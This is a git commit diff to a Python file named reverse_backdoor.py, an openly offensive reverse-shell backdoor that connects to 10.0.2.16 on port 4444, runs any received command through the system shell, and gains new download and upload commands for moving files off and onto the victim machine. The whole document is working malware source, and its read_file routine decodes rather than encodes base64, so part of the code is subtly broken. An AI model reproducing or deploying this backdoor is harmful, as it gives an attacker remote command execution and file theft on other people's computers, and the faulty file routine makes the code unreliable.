9f8bbdf4beabcae7bf2af911d36135febfc5a172
Justin Uminga <164306553+justinadg@users.noreply.github.com>
2024-07-26 12:52:32 +0800

    Update reverse_backdoor.py

--- backdoor/reverse_backdoor.py
+++ backdoor/reverse_backdoor.py
@@ -2,6 +2,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 class Backdoor:
   def __init__(self, ip, port):
@@ -22,27 +23,43 @@ class Backdoor:
         continue
     
   def execute_system_command(self, command):
-    return subprocess.check_output(command, shell=True)
+      return subprocess.check_output(command, shell=True)
 
   def change_working_directory_to(self, path):
     os.chdir(path)
     return "[+] Changing working directory to " + path
   
+  def read_file(self, path):
+    with open(path, "rb") as file:
+      return base64.b64decode(file.read())
+
+  def write_file(self, path, content):
+    with open(path, "wb") as file:
+      file.write(base64.b64decode(content))
+      return "[+] Upload successful."
+
   def run(self):
     while True:
       command = self.reliable_receive()
-      if command[0] = "exit":
-        self.connection.close()
-        exit()
-      elif command[0] = "cd" and len(command) > 1:
-        result = self.change_working_directory_to(command[1])
-      else:
-        result = self.execute_system_command(command)
+
+      try:
+        if command[0] == "exit":
+          self.connection.close()
+          exit()
+        elif command[0] == "cd" and len(command) > 1:
+          result = self.change_working_directory_to(command[1])
+        elif command[0] == "download":
+          result = self.read_file(command[1])
+        elif command[0] == "upload":
+          result = self.write_file(command[1], command[2])
+        else:
+          result = self.execute_system_command(command)
+      except Exception:
+        result = "[-] Error during command execution."
+        
       self.reliable_send(result)
       
       
 
-
 backdoor = Backdoor("10.0.2.16", 4444)
 backdoor.run()
-
